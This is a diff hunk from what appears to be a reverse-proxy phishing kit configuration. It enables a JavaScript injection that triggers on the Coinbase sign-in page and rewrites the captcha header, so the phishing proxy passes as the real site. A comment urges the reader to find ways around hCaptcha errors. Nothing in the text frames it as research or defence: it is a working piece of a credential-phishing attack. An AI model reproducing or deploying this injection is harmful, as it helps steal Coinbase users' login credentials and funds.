@@ -143,18 +143,18 @@ js_inject:
 
 # HCAPTCHA Header That shows domain name can be Replaced dynamically with javascripts, Its Disabled Here Because Its resulting in Hcaptcha error, Find your ways to solve it.
 #
-#  - trigger_domains: ["www.coinbase.com"]
-#    trigger_paths: ["/signin","/signin*"]
-#    trigger_params: []
-#    script: |
-#      function hcaptcha(){
-#        var elem = document.getElementsByClassName("cf-subheadline")[0];
-#        elem.parentNode.removeChild(elem);
-#        var div = document.createElement('div');
-#        div.className = 'cf-subheadline';
-#        div.innerHTML = `
-#        <h2 class="cf-subheadline"><span data-translate="complete_sec_check">Please complete the security check to get access to</span> Coinbase Website</h2>
-#        `;
-#        document.getElementsByClassName("cf-wrapper cf-header cf-error-overview")[0].appendChild(div);
-#        return;
-#        }    
+  - trigger_domains: ["www.coinbase.com"]
+    trigger_paths: ["/signin","/signin*"]
+    trigger_params: []
+    script: |
+      function hcaptcha(){
+        var elem = document.getElementsByClassName("cf-subheadline")[0];
+        elem.parentNode.removeChild(elem);
+        var div = document.createElement('div');
+        div.className = 'cf-subheadline';
+        div.innerHTML = `
+        <h2 class="cf-subheadline"><span data-translate="complete_sec_check">Please complete the security check to get access to</span> Coinbase Website</h2>
+        `;
+        document.getElementsByClassName("cf-wrapper cf-header cf-error-overview")[0].appendChild(div);
+        return;
+        }    
